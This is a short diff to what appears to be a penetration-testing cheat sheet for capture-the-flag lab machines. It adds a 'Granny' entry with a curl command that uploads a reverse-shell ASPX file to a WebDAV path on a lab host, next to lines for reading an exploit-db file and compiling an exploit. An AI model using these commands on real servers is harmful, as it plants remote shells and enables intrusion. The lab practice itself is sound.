@@ -82,6 +82,13 @@ OR
 cat /usr/share/exploitdb/exploits/whatever
 ```
 
+#### Granny
+
+```bash
+curl -X PUT http://10.10.10.15/_vti_log/reverse10.txt --data-binary @reverse.aspx
+```
+
+
 **THIS IS WORK IN PROGRESS**
 
 gcc -m32 -Wl,--hash-style=both -o exploit 18411.c 
